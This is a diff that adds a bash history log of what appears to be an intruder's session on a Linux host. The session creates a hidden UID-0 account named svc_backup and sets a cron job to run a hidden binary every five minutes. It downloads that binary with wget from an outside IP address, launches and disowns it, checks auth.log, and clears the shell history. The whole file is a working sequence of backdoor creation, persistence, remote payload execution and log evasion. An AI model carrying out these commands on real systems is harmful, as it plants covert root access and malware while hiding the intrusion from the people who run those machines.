@@ -1,0 +1,32 @@
+#1782094180
+whoami
+#1782094205
+cat /etc/passwd | grep bash
+#1782094447
+useradd -o -u 0 -g 0 -M -d /home/svc_backup -s /bin/bash svc_backup
+#1782094492
+passwd svc_backup
+#1782094520
+mkdir -p /home/svc_backup
+#1782094540
+chown svc_backup:root /home/svc_backup
+#1782094563
+su - svc_backup -c "whoami"
+#1782094610
+crontab -u svc_backup -l
+#1782094621
+echo "*/5 * * * * /usr/local/bin/.sysupd >/dev/null 2>&1" > /var/spool/cron/crontabs/svc_backup
+#1782094785
+wget http://185.220.101.47:8000/sysupd -O /usr/local/bin/.sysupd
+#1782094792
+chmod +x /usr/local/bin/.sysupd
+#1782094798
+/usr/local/bin/.sysupd &
+#1782094830
+disown -a
+#1782094870
+ps aux | grep sysupd
+#1782095564
+cat /var/log/auth.log | tail -20
+#1782096012
+history -c
